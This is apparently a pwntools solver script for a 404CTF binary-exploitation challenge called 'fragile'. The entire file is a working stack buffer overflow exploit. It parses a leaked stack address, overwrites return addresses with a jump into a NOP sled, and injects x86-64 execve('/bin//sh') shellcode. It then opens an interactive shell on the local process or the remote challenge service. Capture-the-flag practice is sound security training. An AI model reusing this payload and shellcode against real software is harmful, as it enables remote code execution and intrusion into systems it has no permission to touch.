#!/usr/bin/env python3

from pwn import *
from time import sleep

HOST = "challenge.404ctf.fr"
PORT = 31720

exe = ELF("./fragile")

context.log_level = 'info'
context.arch = 'amd64'
context.binary = exe.path
context.terminal = ["tmux", "new-window"]

if args.REMOTE:
    NL = b"\r\n"
else:
    NL = b"\n"

def conn():
    if args.REMOTE:
        r = remote(HOST, PORT)
    else:
        r = process([exe.path])

    return r


def main():
    global r


    r = conn()

    rep = r.recvuntil(b'0\n')


    print(rep)

    buff_add = rep.split(b'\n')[1].split(b' ')[2]

    log.success("Leak : " + buff_add.decode())


    shell_addr = int(buff_add.decode(), 16) + 64 + 4 * 8

    log.success("shell_addr : " + hex(shell_addr))


    payload = b"\x90" * 64
    payload += p64(shell_addr) * 4
    payload += b"\x48\x31\xf6\x56\x5a\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\x6a\x3b\x58\x0f\x05"
    


    r.send(payload + NL)

    r.interactive()



if __name__ == "__main__":
    main()
